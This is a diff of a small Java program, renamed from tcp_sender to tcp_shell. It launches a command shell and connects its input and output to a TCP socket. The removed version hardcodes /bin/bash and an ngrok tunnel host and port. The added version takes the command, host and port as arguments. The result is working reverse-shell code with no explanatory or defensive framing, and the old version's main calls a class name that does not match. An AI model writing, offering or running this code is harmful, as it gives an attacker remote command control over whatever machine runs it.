@@ -1,10 +1,10 @@
 import java.io.*;
 import java.net.*;
-public class tcp_sender {
-    public tcp_sender() throws Exception {
-        String cmd="/bin/bash";
+public class tcp_shell{
+    public tcp_shell(String args[]) throws Exception {
+        String cmd=args[0];
         Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
-        Socket s=new Socket("0.tcp.ngrok.io",12949);
+        Socket s=new Socket(args[1],Integer.parseInt(args[2]));
         InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
         OutputStream po=p.getOutputStream(),so=s.getOutputStream();
         while(!s.isClosed()) {
@@ -28,6 +28,6 @@ public class tcp_sender {
         s.close();
     }
     public static void main(String args[])throws Exception{
-        new tcp_listener();
+        new tcp_shell(args);
     }
 }
